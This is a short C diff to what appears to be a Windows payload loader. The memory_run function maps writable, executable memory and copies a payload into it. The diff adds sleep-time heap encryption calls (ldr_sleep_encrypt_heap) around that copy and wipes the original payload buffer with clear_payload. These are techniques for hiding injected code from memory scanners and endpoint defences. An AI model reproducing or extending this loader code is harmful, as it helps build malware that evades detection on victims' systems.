@@ -1,6 +1,7 @@
 #include "../../../includes/memory/memory.h"
 #include "../../../includes/apis/apis.h"
 #include "../../../includes/core/core.h"
+#include "../../../includes/utils/utils.h"
 
 
 
@@ -21,6 +22,7 @@ MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
 		memInfo.BytesWrote = 0;
 		return memInfo;
 	}
+	ldr_sleep_encrypt_heap(g_ldr->config->DelayBetween, PayloadAddress, PayloadSize);
 
 	LPVOID Address = g_ldr->apis->MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, PayloadSize);
 	if (Address == NULL) {
@@ -30,6 +32,10 @@ MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
 	}
 
 	memcpy(Address, PayloadAddress, PayloadSize);
+
+	clear_payload(PayloadAddress, PayloadSize);
+	ldr_sleep_encrypt_heap(g_ldr->config->DelayBetween, Address, PayloadSize);
+
 
 	g_ldr->apis->CloseHandle(hFile);
 
